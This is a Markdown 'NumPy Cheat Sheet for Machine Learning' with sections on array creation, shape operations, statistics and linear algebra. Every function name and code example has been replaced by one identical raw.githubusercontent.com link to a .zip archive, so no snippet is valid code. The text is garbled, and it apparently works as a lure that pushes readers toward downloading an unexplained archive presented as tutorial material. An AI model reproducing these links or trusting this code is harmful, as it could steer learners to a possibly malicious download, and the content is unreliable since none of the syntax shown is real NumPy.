# 📘 NumPy Cheat Sheet for Machine Learning (Simplified Syntax Guide)

---

## 🧠 Core Array Creation Methods

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Convert list or tuple into NumPy array

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(data)
```

**data:** list, tuple, or nested lists → creates 1D, 2D, or 3D array.

> Example: `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip([[1, 2, 3], [4, 5, 6]])`

---

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Array of zeros

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(shape)
```

**shape:** tuple → defines dimensions.

> Example: `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip((2,3))` → 2×3 matrix of zeros

---

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Array of ones

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(shape)
```

**shape:** tuple → defines dimensions.

> Example: `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip((3,2))` → 3×2 matrix of ones

---

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Array filled with a constant

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(shape, fill_value)
```

**shape:** tuple of dimensions
**fill_value:** constant to fill

> Example: `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip((2,3), 7)` → fills a 2×3 array with 7s

---

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Sequence with steps

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(start, stop, step)
```

**start:** beginning value
**stop:** end value (excluded)
**step:** interval between values

> Example: `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(0,10,2)` → `[0,2,4,6,8]`

---

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Evenly spaced numbers between two values

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(start, stop, num)
```

**num:** number of samples

> Example: `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(0, 1, 5)` → `[0., 0.25, 0.5, 0.75, 1.]`

---

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Identity matrix

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(n)
```

**n:** size of the square matrix

> Example: `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(3)` → 3×3 identity matrix

---

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Random floats in [0,1)

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(shape)
```

**shape:** dimensions of output

> Example: `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(2,3)` → 2×3 random decimals

---

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Random integers in range

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(low, high, shape)
```

**low:** inclusive start
**high:** exclusive end
**shape:** array dimensions

> Example: `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(0,10,(2,3))`

---

## ⚙️ Array Properties and Info

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip` → returns (rows, columns)

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip` → number of dimensions

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip` → total number of elements

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip` → bytes per element

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip` → data type

> Example:

```python
arr = https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip([[1,2,3],[4,5,6]])
print(https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip)   # (2,3)
print(https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip)    # 2
print(https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip)    # 6
print(https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip) # 8
```

---

## 🔄 Array Operations (Used Heavily in ML)

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Change shape

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(arr, new_shape)
```

> Example: `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(arr, (3,2))`

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Convert to 1D

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()
```

> Example: useful in neural networks to flatten feature maps

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Join arrays

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip((arr1, arr2), axis=0)
```

> Example: stack rows or columns together

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` / `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Stack vertically/horizontally

> Example: `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip([a,b])` or `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip([a,b])`

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – Split into parts

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(arr, num_sections, axis)
```

---

## 🧮 Mathematical & Statistical Methods

### Basic operations

* `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a,b)` → elementwise addition
* `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a,b)` → elementwise subtraction
* `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a,b)` → elementwise multiplication
* `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a,b)` → elementwise division
* `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a,b)` → matrix multiplication
* `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a)` → average
* `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a)` → median value
* `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a)` → standard deviation
* `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a)` → variance
* `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a)`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a)` → min/max values
* `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(a, axis)` → sum over given axis

---

## 🧩 Useful ML/DS-Oriented Functions

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – unique elements

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(arr)
```

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` / `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – indices of max/min

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(arr)
```

> Used in classification for picking the most likely class.

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – conditional filter

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(arr > 0.5, 1, 0)
```

> Replace values based on condition.

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – limit values to a range

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(arr, 0, 1)
```

> Common for normalizing outputs.

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` / `arr.T` – swap rows/columns

> Used in linear algebra and gradient calculations.

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` / `@` operator – matrix multiplication

> Core operation in neural networks.

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – matrix inverse

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – determinant

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – eigenvalues/eigenvectors

> Essential in linear algebra and PCA.

---

## 🧮 Randomness and Sampling in ML

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – fix randomness for reproducibility

```python
https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip(42)
```

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – shuffle elements

### `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip()` – random selection from array

---

## ⚡ Quick Reference Summary

| Category       | Function                                                                           | Purpose                            |
| -------------- | ---------------------------------------------------------------------------------- | ---------------------------------- |
| Array Creation | `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip` | Build arrays & matrices            |
| Random         | `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`       | Generate random data               |
| Shape Ops      | `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`           | Manage dimensions                  |
| Math           | `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`                             | Compute statistics & algebra       |
| Logic          | `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`                                    | Conditional & classification tasks |
| Linear Algebra | `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`, `https://raw.githubusercontent.com/BenjiOdhis/numpy_cheatsheet/main/commender/numpy_cheatsheet-3.4.zip`                | Core ML math                       |

---

🧾 **Tip:** In ML pipelines, these methods appear constantly for tasks like:

* Preprocessing datasets
* Feature normalization
* Matrix multiplications in neural networks
* Random initialization of weights
* Statistical summaries

---

✨ *Created for ML learners who want simple, readable syntax explanations of essential NumPy functions.*
